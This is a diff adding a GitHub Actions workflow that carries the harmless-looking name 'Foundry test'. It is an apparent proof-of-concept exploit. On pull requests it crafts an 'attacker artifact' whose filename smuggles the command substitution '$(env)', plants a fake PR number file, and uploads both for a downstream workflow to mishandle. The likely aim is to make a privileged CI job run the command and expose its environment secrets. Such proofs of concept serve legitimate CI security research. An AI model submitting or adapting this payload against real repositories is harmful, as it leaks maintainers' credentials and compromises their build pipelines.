@@ -1,0 +1,23 @@
+name: Foundry test
+
+on:
+  pull_request:
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: craft attacker artifact
+        run: |
+          mkdir -p out
+          PAY=$(cat <<'PAYLOAD'
+          $(env)
+          PAYLOAD
+          )
+          printf 'x\n' > "out/$PAY"
+          printf '122\n' > out/pr_number.txt
+          ls -la out
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content-poc
+          path: out
